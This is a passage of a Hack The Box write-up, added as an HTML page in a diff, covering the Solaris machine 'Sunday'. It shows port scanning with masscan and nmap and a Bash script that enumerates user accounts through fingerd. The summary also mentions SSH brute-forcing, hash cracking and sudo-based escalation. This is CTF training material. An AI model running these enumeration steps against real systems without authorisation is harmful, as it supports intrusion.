@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.49" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hack The Box Write-up - Sunday | text/plain</title>
+    <meta name="description" content="Write-up for the machine Sunday from Hack The Box. The box is
+pretty straightforward but still cool to do. You start with enumerating finger,
+finding some usernames. If you did thorough port scans and did not miss SSH on
+a non-standard port, one of these names allow you to brute-force your way into the box.
+Cracking a password hash from a shadow-file backup you find get&#39;s you to the
+other, from which you can escalate to root after realizing you can sudo wget.
+">
+    <meta name="keywords" content="ctf, infosec, hackthebox, write-up">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Hack The Box Write-up - Sunday" />
+<meta property="og:description" content="Write-up for the machine Sunday from Hack The Box. The box is
+pretty straightforward but still cool to do. You start with enumerating finger,
+finding some usernames. If you did thorough port scans and did not miss SSH on
+a non-standard port, one of these names allow you to brute-force your way into the box.
+Cracking a password hash from a shadow-file backup you find get&#39;s you to the
+other, from which you can escalate to root after realizing you can sudo wget.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/htb_sunday/" /><meta property="article:published_time" content="2018-09-30T00:00:00&#43;02:00"/>
+<meta property="article:modified_time" content="2018-09-30T00:00:00&#43;02:00"/>
+
+    
+
+
+
+  <meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/htb_sunday/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+</style>
+
+    
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="active" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    
+<meta itemprop="name" content="Hack The Box Write-up - Sunday">
+<meta itemprop="description" content="Write-up for the machine Sunday from Hack The Box. The box is
+pretty straightforward but still cool to do. You start with enumerating finger,
+finding some usernames. If you did thorough port scans and did not miss SSH on
+a non-standard port, one of these names allow you to brute-force your way into the box.
+Cracking a password hash from a shadow-file backup you find get&#39;s you to the
+other, from which you can escalate to root after realizing you can sudo wget.
+">
+
+
+<meta itemprop="datePublished" content="2018-09-30T00:00:00&#43;02:00" />
+<meta itemprop="dateModified" content="2018-09-30T00:00:00&#43;02:00" />
+<meta itemprop="wordCount" content="1675">
+
+
+
+<meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up," />
+
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Hack The Box Write-up - Sunday</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>8 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2018-09-30T00:00:00&#43;02:00">30 Sep, 2018</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">Write-up for the machine Sunday from Hack The Box. The box is
+pretty straightforward but still cool to do. You start with enumerating finger,
+finding some usernames. If you did thorough port scans and did not miss SSH on
+a non-standard port, one of these names allow you to brute-force your way into the box.
+Cracking a password hash from a shadow-file backup you find get&#39;s you to the
+other, from which you can escalate to root after realizing you can sudo wget.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scan">Port scan</a></li>
+<li><a href="#fingerd">fingerd</a></li>
+</ul></li>
+<li><a href="#breaking-in">Breaking in</a>
+<ul>
+<li><a href="#ssh-password-guessing">SSH password guessing</a></li>
+</ul></li>
+<li><a href="#from-sunny-to-sammy">From sunny to sammy</a>
+<ul>
+<li><a href="#rabbit-hole">Rabbit hole</a></li>
+<li><a href="#cracking-sammy-s-password">Cracking sammy&rsquo;s password</a></li>
+</ul></li>
+<li><a href="#from-sammy-to-root">From sammy to root</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      
+
+<p>After quite a while, this is another write for a <a href="https://www.hackthebox.eu/">Hack The Box</a>
+machine. This time for &ldquo;Sunday&rdquo;, a relatively easy machine based on Solaris.
+Never worked with this OS before, so I was keen to see what I would find.</p>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<h2 id="port-scan">Port scan</h2>
+
+<p>To start, we quickly scan the ports of the box.
+An initial scan with high rate using <code>masscan</code> takes only a few seconds and
+reveals a few open ports:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ masscan -e tun0 -p <span style="color: #ae81ff">1</span>-65535 --rate <span style="color: #ae81ff">2000</span> <span style="color: #ae81ff">10</span>.10.10.76
+...
+Discovered open port 111/tcp on 10.10.10.76
+Discovered open port 42492/tcp on 10.10.10.76
+Discovered open port 62177/tcp on 10.10.10.76
+Discovered open port 22022/tcp on 10.10.10.76
+Discovered open port 79/tcp on 10.10.10.76
+...
+</code></pre></div>
+
+<p>Had we scanned with <code>nmap</code> initially, we would either miss the high
+non-standard ports or the scan would take very long. <code>masscan</code> is much faster.
+Only for all open ports we follow up with a more thorough <code>nmap</code> scan:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ nmap -sV -sC -p <span style="color: #ae81ff">111</span>,42492,62177,22022,79 <span style="color: #ae81ff">10</span>.10.10.76
+...
+PORT      STATE SERVICE   VERSION
+79/tcp    open  finger    Sun Solaris fingerd
+|_finger: No one logged on\x0D
+111/tcp   open  rpcbind   2-4 (RPC #100000)
+Connection closed by foreign host.
+22022/tcp open  ssh       SunSSH 1.3 (protocol 2.0)
+| ssh-hostkey:
+|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
+|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
+42492/tcp open  unknown
+62177/tcp open  smserverd 1 (RPC #100155)
+Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
+...
+</code></pre></div>
+
+<p>We find a Solaris machine, as promised by the HackTheBox
+<a href="hackthebox.eu/home/machines/list">machine list</a>.
+We also see a few interesting services like finger and rcpbind, which suggests
+there might be NFS shares.
+An SSH daemon is running on a non-standard port as well.
+Moreover, we have a few higher-region ports with services I do not know too
+much about.</p>
+
+<h2 id="fingerd">fingerd</h2>
+
+<p>Finger is very easy to enumerate, so we go for that one first.
+First some background. <a href="https://tools.ietf.org/html/rfc742">finger</a> is an
+ancient network protocol that allows remote users to get information about
+users of a machine. It has a history of being related to security issues
+(e.g., <a href="http://www.cs.unc.edu/~jeffay/courses/nidsS05/attacks/seely-RTMworm-89.html#p4.5.2">Morris worm in 1988</a>)
+and allows enumeration of system users with word lists.</p>
+
+<p>To query information, use the <code>finger</code> tool, which is the client for <code>fingerd</code>.
+Give it a username and host and it will either output information if that user
+exists, or &ldquo;???&rdquo; if it does not:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ finger -ls root@10.10.10.76
+Login name: root                        In real life: Super-User
+Directory: /root                        Shell: /usr/bin/bash
+Last login Thu Sep 13 20:42 on pts/3 from sunday
+Mail last read Thu Sep 13 20:45:34 2018
+No Plan.
+
+ $ finger -ls non-existing-user@10.10.10.76
+Login name: non-existing-user                   In real life: ???
+</code></pre></div>
+
+<p>The same can be achieved without <code>finger</code> just by using plain old <code>telnet</code>:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ telnet <span style="color: #ae81ff">10</span>.10.10.76 <span style="color: #ae81ff">79</span>
+Trying 10.10.10.76...
+Connected to 10.10.10.76.
+Escape character is &#39;^]&#39;.
+root
+Login       Name               TTY         Idle    When    Where
+root     Super-User            pts/3        &lt;Apr 24 10:37&gt; sunday
+
+ $ telnet <span style="color: #ae81ff">10</span>.10.10.76 <span style="color: #ae81ff">79</span>
+Trying 10.10.10.76...
+Connected to 10.10.10.76.
+Escape character is &#39;^]&#39;.
+non-existing-user
+Login       Name               TTY         Idle    When    Where
+non-existing-user       ???
+Connection closed by foreign host.
+</code></pre></div>
+
+<p>Some information on users that should exist on the box by default can be found
+in the Oracle Solaris
+<a href="https://docs.oracle.com/cd/E36784_01/html/E36818/userconcept-20.html">documentation</a>.</p>
+
+<p>To find other users, we can enumerate finger with a username wordlist.
+A good list is in <a href="https://github.com/danielmiessler/SecLists">SecLists</a> at
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt">Usernames/Names/names.txt</a>.
+It has about 10k lines. A short Bash script will do the trick:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-bash" data-lang="bash"><span></span><span style="color: #75715e">#!/bin/bash</span>
+
+<span style="color: #f8f8f2">wordlist</span><span style="color: #f92672">=</span>/opt/SecLists/Usernames/Names/names.txt
+
+<span style="color: #66d9ef">while</span> <span style="color: #f8f8f2">read</span> user<span style="color: #f8f8f2">;</span> <span style="color: #66d9ef">do</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f92672">[</span> <span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">$user</span><span style="color: #e6db74">&quot;</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&quot;&quot;</span> <span style="color: #f92672">]</span><span style="color: #f8f8f2">;</span> <span style="color: #66d9ef">then</span>
+        <span style="color: #66d9ef">continue</span>
+    <span style="color: #66d9ef">fi</span>
+
+    <span style="color: #f8f8f2">result</span><span style="color: #f92672">=</span><span style="color: #e6db74">`</span>finger <span style="color: #f8f8f2">$user</span>@10.10.10.76<span style="color: #e6db74">`</span>
+    <span style="color: #66d9ef">if</span> <span style="color: #f92672">[[</span> ! <span style="color: #f8f8f2">$result</span> <span style="color: #f92672">=</span>~ ^.*<span style="color: #ae81ff">\?\?\?</span>.*$ <span style="color: #f92672">]]</span><span style="color: #f8f8f2">;</span> <span style="color: #66d9ef">then</span>
+        <span style="color: #f8f8f2">echo</span> <span style="color: #e6db74">&quot;### --- ###&quot;</span>
+        <span style="color: #f8f8f2">echo</span> <span style="color: #e6db74">&quot;User found: </span><span style="color: #f8f8f2">$user</span><span style="color: #e6db74">&quot;</span>
+        <span style="color: #f8f8f2">echo</span> <span style="color: #e6db74">&quot; --- Details:&quot;</span>
+        <span style="color: #f8f8f2">echo</span> <span style="color: #f8f8f2">$result</span>
+        <span style="color: #f8f8f2">echo</span> <span style="color: #e6db74">&quot;&quot;</span>
+    <span style="color: #66d9ef">fi</span>
+<span style="color: #66d9ef">done</span> &lt; <span style="color: #f8f8f2">$wordlist</span>
+</code></pre></div>
+
+<p>Note that <code>fingerd</code> does not return information only on the user you request.
+Rather, it will do some sort of full text search in the user information. For
+example, it will return information on &ldquo;nobody4&rdquo; when querying for &ldquo;user&rdquo; since
+the real name of &ldquo;nobody4&rdquo; is &ldquo;SunOS 4.x NFS Anonymous Access User&rdquo;. You could
+disable this behaviour with a flag, but ouch chances of discovering users would
+only get lower.</p>
+
+<p>The script runs for a while and provides us with two interesting usernames:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ ./finger_enum.sh
+...
+#<span style="color: #75715e">## --- ###</span>
+User found: sammy
+ --- Details:
+Login Name TTY Idle When Where sammy sammy pts/3 &lt;Sep 13 20:40&gt; 10.10.15.130
+
+...
+#<span style="color: #75715e">## --- ###</span>
+User found: sunny
+ --- Details:
+Login Name TTY Idle When Where sunny sunny pts/3 &lt;Apr 24 10:48&gt; 10.10.14.4
+
+...
